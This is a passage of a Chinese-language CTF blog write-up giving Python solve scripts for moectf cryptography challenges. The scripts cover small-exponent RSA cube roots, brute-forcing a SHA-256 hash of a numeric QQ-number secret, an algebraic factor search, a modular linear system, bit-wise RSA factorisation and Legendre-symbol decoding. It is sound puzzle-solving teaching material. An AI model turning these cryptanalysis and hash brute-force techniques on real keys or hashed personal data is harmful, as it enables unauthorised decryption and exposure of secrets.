class="hljs-number">150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757</span><br>e = <span class="hljs-number">3</span><br>n = <span class="hljs-number">20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787</span><br><br><span class="hljs-comment"># 使用 gmpy2 提供的立方根计算函数</span><br>m, exact = gmpy2.iroot(c, e)<br><br><span class="hljs-comment"># 如果立方根是精确的，我们可以直接获取明文</span><br><span class="hljs-keyword">if</span> exact:<br>    flag = long_to_bytes(m)<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密文可能无法直接解密，或者立方根不精确。&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="ez-hash"><a href="#ez-hash" class="headerlink" title="ez_hash"></a>ez_hash</h2><p>给的提示其实因为是qq号所以都是数字，直接爆破就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-comment"># 给定的哈希值</span><br>target_hash = <span class="hljs-string">&#x27;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#x27;</span><br><span class="hljs-comment"># 已知的秘密开头</span><br>prefix = <span class="hljs-string">b&#x27;2100&#x27;</span><br><span class="hljs-comment"># 暴力破解可能的秘密</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):  <span class="hljs-comment"># 从 000000 到 999999</span><br>    <span class="hljs-comment"># 格式化为 6 位数字，不足的前面补零</span><br>    suffix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i:06&#125;</span>&#x27;</span>.encode()<br>    secrets = prefix + suffix<br>    <span class="hljs-comment"># 计算 SHA-256 哈希值</span><br>    hash_value = sha256(secrets).hexdigest()<br>    <span class="hljs-comment"># 检查哈希值是否匹配</span><br>    <span class="hljs-keyword">if</span> hash_value == target_hash:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found secrets: <span class="hljs-subst">&#123;secrets.decode()&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><h2 id="baby-equation"><a href="#baby-equation" class="headerlink" title="baby_equation"></a>baby_equation</h2><p>首先对这个进行化简<br>$$<br>((a^2 + 1)<em>(b^2 + 1) - 2</em>(a - b)<em>(a</em>b - 1)) &#x3D;&#x3D; 4*(k + a*b)<br>$$</p><p>$$<br>(a+1)^2(b-1)^2&#x3D;4k<br>$$</p><p>然后还有求a,b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">tot, index, ls</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    递归查找函数，用于寻找合适的因子组合，使得通过这些因子构造出的数字能够还原出 flag。</span><br><span class="hljs-string">    :param tot: 当前的乘积值（初始值为1）。</span><br><span class="hljs-string">    :param index: 当前处理的因子索引。</span><br><span class="hljs-string">    :param ls: 因子列表，包含所有可能的因子。</span><br><span class="hljs-string">    :return: 满足条件的乘积值，如果未找到则返回0。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 基准情况：如果已经检查了所有因子</span><br>    <span class="hljs-keyword">if</span> index == <span class="hljs-built_in">len</span>(ls):<br>        <span class="hljs-comment"># 检查当前的 tot 是否可能包含 flag 的特征字符串（例如 &#x27;moectf&#123;&#x27;）</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;moectf&#123;&#x27;</span> <span class="hljs-keyword">in</span> long_to_bytes(tot):<br>            <span class="hljs-keyword">return</span> tot  <span class="hljs-comment"># 返回找到的值</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># 没找到返回 0</span><br><br>    <span class="hljs-comment"># 递归查找，尝试包含当前因子的情况</span><br>    a = find(tot * ls[index], index + <span class="hljs-number">1</span>, ls)<br>    <span class="hljs-comment"># 递归查找，尝试不包含当前因子的情况</span><br>    b = find(tot, index + <span class="hljs-number">1</span>, ls)<br><br>    <span class="hljs-comment"># 返回找到的非零结果</span><br>    <span class="hljs-keyword">return</span> a <span class="hljs-keyword">if</span> a != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> b<br><br><br><span class="hljs-comment"># 给定的常量 k 值</span><br>k = <span class="hljs-number">0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40</span><br><br><span class="hljs-comment"># 计算 a1b1 = sqrt(4 * k)</span><br>a1b1 = gmpy2.iroot(<span class="hljs-number">4</span> * k, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># 因子列表，包含可能分解出的因子组合</span><br>fac = [<br>    <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">31</span>, <span class="hljs-number">61</span>, <span class="hljs-number">223</span>, <span class="hljs-number">4013</span>, <span class="hljs-number">281317</span>, <span class="hljs-number">4151351</span>, <span class="hljs-number">339386329</span>, <span class="hljs-number">370523737</span>,<br>    <span class="hljs-number">5404604441993</span>, <span class="hljs-number">26798471753993</span>, <span class="hljs-number">25866088332911027256931479223</span>,<br>    <span class="hljs-number">64889106213996537255229963986303510188999911</span><br>]<br><br><span class="hljs-comment"># 使用递归查找因子组合，得到 a1</span><br>a1 = find(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, fac)<br><br><span class="hljs-comment"># 计算 b1 = a1b1 // a1</span><br>b1 = a1b1 // a1<br><br><span class="hljs-comment"># 使用 long_to_bytes 将 a1 和 b1 转换为字节并输出 flag</span><br><span class="hljs-built_in">print</span>(long_to_bytes(a1 - <span class="hljs-number">1</span>) + long_to_bytes(b1 + <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h2 id="new-system"><a href="#new-system" class="headerlink" title="new_system"></a>new_system</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-comment"># 给定的值</span><br>a1, c1 = [<span class="hljs-number">48152794364522745851371693618734308982941622286593286738834529420565211572487</span>, <span class="hljs-number">21052760152946883017126800753094180159601684210961525956716021776156447417961</span>]<br>a2, c2 = [<span class="hljs-number">48649737427609115586886970515713274413023152700099032993736004585718157300141</span>, <span class="hljs-number">6060718815088072976566240336428486321776540407635735983986746493811330309844</span>]<br>a, c = [<span class="hljs-number">30099883325957937700435284907440664781247503171217717818782838808179889651361</span>, <span class="hljs-number">85333708281128255260940125642017184300901184334842582132090488518099650581761</span>]<br>q = <span class="hljs-number">105482865285555225519947662900872028851795846950902311343782163147659668129411</span><br><br>b = (c - c1 - c2) % q<br>d = (a - a1 - a2) % q<br><br><span class="hljs-keyword">assert</span> b &gt; <span class="hljs-number">0</span><br><span class="hljs-keyword">assert</span> d &gt; <span class="hljs-number">0</span><br><span class="hljs-keyword">assert</span> gmpy2.gcd(d, q) == <span class="hljs-number">1</span><br>inv_d = gmpy2.invert(d, q)<br>x = (b * inv_d) % q<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;The value of x is: <span class="hljs-subst">&#123;x&#125;</span>&quot;</span>)<br><br>gift = (c - a * x) % q<br><span class="hljs-built_in">print</span>(long_to_bytes(gift))<br></code></pre></td></tr></table></figure><h2 id="RSA-revenge"><a href="#RSA-revenge" class="headerlink" title="RSA_revenge"></a>RSA_revenge</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 给定的数值</span><br>n = <span class="hljs-number">141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901</span><br>c = <span class="hljs-number">47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 初始的 Brute Force 用于寻找 p 和 q</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force</span>(<span class="hljs-params">a, b, k</span>):<br>    <span class="hljs-keyword">if</span> k == <span class="hljs-number">256</span>:<br>        <span class="hljs-keyword">if</span> a * b == n:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;找到因子: a=<span class="hljs-subst">&#123;a&#125;</span>, b=<span class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">return</span> a, b<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>            a1 = a + i * (<span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k)) + j * (<span class="hljs-number">2</span> ** k)<br>            b1 = b + j * (<span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k)) + i * (<span class="hljs-number">2</span> ** k)<br><br>            <span class="hljs-keyword">if</span> a1 * b1 &gt; n:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> (a1 + <span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k)) * ((b1 + <span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k))) &lt; n:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> (a1 * b1) % (<span class="hljs-number">2</span> ** (k + <span class="hljs-number">1</span>)) != n % (<span class="hljs-number">2</span> ** (k + <span class="hljs-number">1</span>)):<br>                <span class="hljs-keyword">continue</span><br><br>            result = brute_force(a1, b1, k + <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> result:<br>                <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 调用 Brute Force 函数来找到 p 和 q</span><br>p, q = brute_force(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># RSA 解密函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_rsa</span>(<span class="hljs-params">p, q, c, e</span>):<br>    <span class="hljs-comment"># 计算模数 n 和 Euler&#x27;s totient (phi)</span><br>    n = p * q<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># 计算私钥 d</span><br>    d = gmpy2.invert(e, phi)<br><br>    <span class="hljs-comment"># 使用私钥解密密文</span><br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    <span class="hljs-keyword">return</span> long_to_bytes(m)<br><br><span class="hljs-comment"># 解密并打印结果</span><br>plaintext = decrypt_rsa(p, q, c, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;解密后的明文: <span class="hljs-subst">&#123;plaintext.decode()&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="ezlegendre"><a href="#ezlegendre" class="headerlink" title="ezlegendre"></a>ezlegendre</h2><p>对于密文中的每个数字 n，我们计算 (n-a | p) 的勒让德符号。</p><p>如果勒让德符号为 1，则对应的原始比特为 1；否则为 0。</p><p>我们将所有解密出的比特拼接成一个二进制字符串。</p><p>最后，我们将二进制字符串每8位转换为一个ASCII字符，得到最终的明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> legendre_symbol<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">ciphertext, p, a</span>):<br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> ciphertext:<br>        <span class="hljs-comment"># 计算勒让德符号 (n|p) 和 (a|p)</span><br>        leg_n = legendre_symbol(n, p)<br>        leg_a = legendre_symbol(a, p)<br><br>        <span class="hljs-comment"># 如果 (n|p) == (a|p)，则原始比特为 0，否则为 1</span><br>        bit = <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> leg_n == leg_a <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;1&#x27;</span><br>        plaintext += bit<br><br>    <span class="hljs-comment"># 将二进制字符串转换为ASCII字符</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plaintext), <span class="hljs-number">8</span>):<br>        byte = plaintext[i:i + <span class="hljs-number">8</span>]<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>))<br><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-comment"># 给定的参数</span><br>p = <span class="hljs-number">303597842163255391032954159827039706827</span><br>a = <span class="hljs-number">34032839867482535877794289018590990371</span><br><br><span class="hljs-comment"># 从给定的输出中提取密文</span><br>ciphertext = [<span class="hljs-number">278121435714344315140568219459348432240</span>, <span class="hljs-number">122382422611852957172920716982592319058</span>, <span class="hljs-number">191849618185577692976529819600455462899</span>, <span class="hljs-number">94093446512724714011050732403953711672</span>, <span class="hljs-number">201558180013426239467911190374373975458</span>, <span class="hljs-number">68492033218601874497788216187574770779</span>, <span class="hljs-number">126947642955989000352009944664122898350</span>, <span class="hljs-number">219437945679126072290321638679586528971</span>, <span class="hljs-number">10408701004947909240690738287845627083</span>, <span class="hljs-number">219535988722666848383982192122753961</span>, <span class="hljs-number">173567637131203826362373646044183699942</span>, <span class="hljs-number">80338874032631996985988465309690317981</span>, <span class="hljs-number">61648326003245372053550369002454592176</span>, <span class="hljs-number">277054378705807456129952597025123788853</span>, <span class="hljs-number">17470857904503332214835106820566514388</span>, <span class="hljs-number">107319431827283329450772973114594535432</span>, <span class="hljs-number">238441423134995169136195506348909981918</span>, <span class="hljs-number">99883768658373018345315220015462465736</span>, <span class="hljs-number">188411315575174906660227928060309276647</span>, <span class="hljs-number">295943321241733900048293164549062087749</span>, <span class="hljs-number">262338278682686249081320491433984960912</span>, <span class="hljs-number">22801563060010960126532333242621361398</span>, <span class="hljs-number">36078000835066266368898887303720772866</span>, <span class="hljs-number">247425961449456125528957438120145449797</span>, <span class="hljs-number">843438089399946244829648514213686381</span>, <span class="hljs-number">134335534828960937622820717215822744145</span>, <span class="hljs-number">74167533116771086420478022805099354924</span>, <span class="hljs-number">249545124784428362766858349552876226287</span>, <span class="hljs-number">37282715721530125580150140869828301122</span>, <span class="hljs-number">196898478251078084893324399909636605522</span>, <span class="hljs-number">238696815190757698227115893728186526132</span>, <span class="hljs-number">299823696269712032566096751491934189084</span>, <span class="hljs-number">36767842703053676220422513310147909442</span>, <span class="hljs-number">281632109692842887259013724387076511623</span>, <span class="hljs-number">205224361514529735350420756653899454354</span>, <span class="hljs-number">129596988754151892987950536398173236050</span>, <span class="hljs-number">97446545236373291551224026108880226180</span>, <span class="hljs-number">14756086145599449889630210375543256004</span>, <span class="hljs-number">286168982698537894139229515711563677530</span>, <span class="hljs-number">100213185917356165383902831965625948491</span>, <span class="hljs-number">268158998117979449824644211372962370753</span>, <span class="hljs-number">264445941122079798432485452672458533870</span>, <span class="hljs-number">87798213581165493463875527911737074678</span>, <span class="hljs-number">131092115794704283915645135973964447801</span>, <span class="hljs-number">164706020771920540681638256590936188046</span>, <span class="hljs-number">178911145710348095185845690896985420147</span>, <span class="hljs-number">154776411353263771717768237918437437524</span>, <span class="hljs-number">260700611701259748940616668959555019434</span>, <span class="hljs-number">222035631087536380654643071679210307962</span>, <span class="hljs-number">281292430628313502184158157303993732703</span>, <span class="hljs-number">24585161817233257375093541076165757776</span>, <span class="hljs-number">269816384363209013058085915818661743171</span>, <span class="hljs-number">39975571110634682056180877801094873602</span>, <span class="hljs-number">125235869385356820424712474803526156473</span>, <span class="hljs-number">218090799597950517977618266111343968738</span>, <span class="hljs-number">144927096680470512196610409630841999788</span>, <span class="hljs-number">213811208492716237073777701143156745108</span>, <span class="hljs-number">64650890972496600196147221913475681291</span>, <span class="hljs-number">302694535366090904732833802133573214043</span>, <span class="hljs-number">214939649183312746702067838266793720455</span>, <span class="hljs-number">219122905927283854730628133811860801459</span>, <span class="hljs-number">224882607595640234803004206355378578645</span>, <span class="hljs-number">260797062521664439666117613111279885285</span>, <span class="hljs-number">279805661574982797810336125346375782066</span>, <span class="hljs-number">147173814739967617543091047462951522968</span>, <span class="hljs-number">23908277835281045050455945166237585493</span>, <span class="hljs-number">186338363482466926309454195056482648936</span>, <span class="hljs-number">295140548360506354817984847059061185817</span>, <span class="hljs-number">151948366859968493761034274719548683660</span>, <span class="hljs-number">96829048650546562162402357888582895187</span>, <span class="hljs-number">61129603762762161772506800496463804206</span>, <span class="hljs-number">83474322431616849774020088719454672415</span>, <span class="hljs-number">25094865151197136947956010155927090038</span>, <span class="hljs-number">86284568910378075382309315924388555908</span>, <span class="hljs-number">269311313874077441782483719283243368999</span>, <span class="hljs-number">293865655623484061732669067594899514872</span>, <span class="hljs-number">42618744258317592068586041005421369378</span>, <span class="hljs-number">54330626035773013687614797098120791595</span>, <span class="hljs-number">147903584483139198945881545544727290390</span>, <span class="hljs-number">290219451327796902155034830296135328101</span>, <span class="hljs-number">147951591390019765447087623264411247959</span>, <span class="hljs-number">176721307425594106045985172455880551666</span>, <span class="hljs-number">10617017342351249793850566048327751981</span>, <span class="hljs-number">166002147246002788729535202156354835048</span>, <span class="hljs-number">43653265786517886972591512103899543742</span>, <span class="hljs-number">191250321143079662898769478274249620839</span>, <span class="hljs-number">142288830015965036385306900781029447609</span>, <span class="hljs-number">231943053864301712428957240550789860578</span>, <span class="hljs-number">259705854206260213018172677443232515015</span>, <span class="hljs-number">42547692646223561211915772930251024103</span>, <span class="hljs-number">210863755365631055277867177762462471179</span>, <span class="hljs-number">140297326776889591830655052829600610449</span>, <span class="hljs-number">136970598261461830690726521708413303997</span>, <span class="hljs-number">93221970399798040564077738881047391445</span>, <span class="hljs-number">192314170920206027886439562261321846026</span>, <span class="hljs-number">95904582457122325051140875987053990027</span>, <span class="hljs-number">158334009503860664724416914265160737388</span>, <span class="hljs-number">134039922705083767606698907224295596883</span>, <span class="hljs-number">7789601161004867293103537392246577269</span>, <span class="hljs-number">261069289329878459425835380641261840913</span>, <span class="hljs-number">123743427894205417735664872035238090896</span>, <span class="hljs-number">20126583572929979071576315733108811761</span>, <span class="hljs-number">5317214299018099740195727361345674110</span>, <span class="hljs-number">68965882674411789667953455991785095270</span>, <span class="hljs-number">235934145208367401015357242228361016868</span>, <span class="hljs-number">250709310980093244562698210062174570956</span>, <span class="hljs-number">167048130489822745377277729681835553856</span>, <span class="hljs-number">122439593796334321806299678109589886368</span>, <span class="hljs-number">117953800124952553873241816859976377866</span>, <span class="hljs-number">226311466875372429157352019491582796620</span>, <span class="hljs-number">301401080214561977683439914412806833619</span>, <span class="hljs-number">255816105091394723475431389696875064495</span>, <span class="hljs-number">73243049441397892506665249226961409560</span>, <span class="hljs-number">226985189100195407227032930008331832009</span>, <span class="hljs-number">164462051705780513134747720427967016844</span>, <span class="hljs-number">97905180778488273557095248936896399883</span>, <span class="hljs-number">40737879120410802220891174679005117779</span>, <span class="hljs-number">180413920169781019749877067396006212488</span>, <span class="hljs-number">171309368917976988181007951396904157090</span>, <span class="hljs-number">215065878665354148046787050342635722874</span>, <span class="hljs-number">54225964222741166664978354789209176721</span>, <span class="hljs-number">179980445108969868669560591527220171967</span>, <span class="hljs-number">39118880593034932654127449293138635964</span>, <span class="hljs-number">170210538859699997092506207353260760212</span>, <span class="hljs-number">62152643864232748107111075535730424573</span>, <span class="hljs-number">28285579676042878568229909932560645217</span>, <span class="hljs-number">69823876778445954036922428013285910904</span>, <span class="hljs-number">170371231064701443428318684885998283021</span>, <span class="hljs-number">211884923965526285445904695039560930451</span>, <span class="hljs-number">2912793651373467597058997684762696593</span>, <span class="hljs-number">220544861190999177045275484705781090327</span>, <span class="hljs-number">142755270297166955179253470066788794096</span>, <span class="hljs-number">264271123927382232040584192781810655563</span>, <span class="hljs-number">214901195876112453126242978678182365781</span>, <span class="hljs-number">252916600207311996808457367909175218824</span>, <span class="hljs-number">176399700725319294248909617737135018444</span>, <span class="hljs-number">230677646264271256129104604724615560658</span>, <span class="hljs-number">1568101696521094800575010545520002520</span>, <span class="hljs-number">276644650735844694794889591823343917140</span>, <span class="hljs-number">185355461344975191330786362319126511681</span>, <span class="hljs-number">248497269558037476989199286642120676823</span>, <span class="hljs-number">27426372552503547932146407600438894266</span>, <span class="hljs-number">99885839446999373024614710052031031159</span>, <span class="hljs-number">238693364649026611386487480573211208980</span>, <span class="hljs-number">27047849084544903200283111147329657123</span>, <span class="hljs-number">261687609401872239323715016608713989139</span>, <span class="hljs-number">34926503987070847956303036393611830590</span>, <span class="hljs-number">252495954285655595492775877967398282722</span>, <span class="hljs-number">249358827602419141539353237669905281246</span>, <span class="hljs-number">42551212101869966935955269842854722856</span>, <span class="hljs-number">286527336123436427709115043975536071462</span>, <span class="hljs-number">158097411156207320921055042509886995091</span>, <span class="hljs-number">40982984899524424348979403377331335675</span>, <span class="hljs-number">87268254405858939730919659372073314983</span>, <span class="hljs-number">142920872841164853694746048293715385493</span>, <span class="hljs-number">280344634952903421792629929689092857993</span>, <span class="hljs-number">203584314487374069738101729666435007339</span>, <span class="hljs-number">76747904284507590577908045394001414841</span>, <span class="hljs-number">18608573158088521401404614102481693137</span>, <span class="hljs-number">104158289118605398449367221892619783009</span>, <span class="hljs-number">182616719368573751169836443225324741716</span>, <span class="hljs-number">272025723760783252166092979911587562064</span>, <span class="hljs-number">24194069309604403496494752448487752613</span>, <span class="hljs-number">71973842397785917741048132725314885345</span>, <span class="hljs-number">281558046604363121112749722271741416764</span>, <span class="hljs-number">66965324704079734796576428718112513855</span>, <span class="hljs-number">105222756356650324548621319241035836840</span>, <span class="hljs-number">331654051401420900830576011369146182</span>, <span class="hljs-number">131087815164777263900650262777429797113</span>, <span class="hljs-number">76104729920151139813274463849368737612</span>, <span class="hljs-number">163253554841934325278065946152769269296</span>, <span class="hljs-number">35973933431510942249046321254376084104</span>, <span class="hljs-number">223355354158871484030430212060934655984</span>, <span class="hljs-number">181704973473887713398031933516341967465</span>, <span class="hljs-number">131391458395622565487686089688656869743</span>, <span class="hljs-number">153029062510158353978320224242258979076</span>, <span class="hljs-number">75598349867958834632866616947240059419</span>, <span class="hljs-number">107656133091853571710502064573530657194</span>, <span class="hljs-number">261653899003034450454605322537555204702</span>, <span class="hljs-number">102387069931966536076616272953425585051</span>, <span class="hljs-number">174654548539988861301269811985320013260</span>, <span class="hljs-number">30731762585661721683653192240732246059</span>, <span class="hljs-number">265493340795853624586170054917042208660</span>, <span class="hljs-number">174818040730242275465453007894471517233</span>, <span class="hljs-number">99514915046145707535310601810631334278</span>, <span class="hljs-number">133978892607644700903700803642408771370</span>, <span class="hljs-number">216019770199630171637325931783378096100</span>, <span class="hljs-number">76687884966028369399497157007109898467</span>, <span class="hljs-number">262185741950606001987209986574269562289</span>, <span class="hljs-number">101935410844521914696784339882721918198</span>, <span class="hljs-number">85956270718878931834010975962772401589</span>, <span class="hljs-number">117578315837774870077915813512746446219</span>, <span class="hljs-number">209811226703488479967593762805568394383</span>, <span class="hljs-number">85782228978690599612110880989543246041</span>, <span class="hljs-number">234993402267259336147096170367513324439</span>, <span class="hljs-number">158487299348452041021565296682698871789</span>, <span class="hljs-number">159701431055714867184644360639841355076</span>, <span class="hljs-number">109022557288733938098734847159477770521</span>, <span class="hljs-number">20764822884655633017647117775843651332</span>, <span class="hljs-number">144987524936939260617020678038224835887</span>, <span class="hljs-number">214906746504968333094519539609226540495</span>, <span class="hljs-number">61852186870193663367998110214331582115</span>, <span class="hljs-number">90175894032076080713807606548780168998</span>, <span class="hljs-number">283504071501037047650569090140982777586</span>, <span class="hljs-number">267695305479884628857258564337611106120</span>, <span class="hljs-number">2466175482923380874813569827625743835</span>, <span class="hljs-number">62561740902965346823256447383892272796</span>, <span class="hljs-number">181458673990444296212252831090106274182</span>, <span class="hljs-number">151903421483215372136947284355251617709</span>, <span class="hljs-number">19545903652854510304023406921387221130</span>, <span 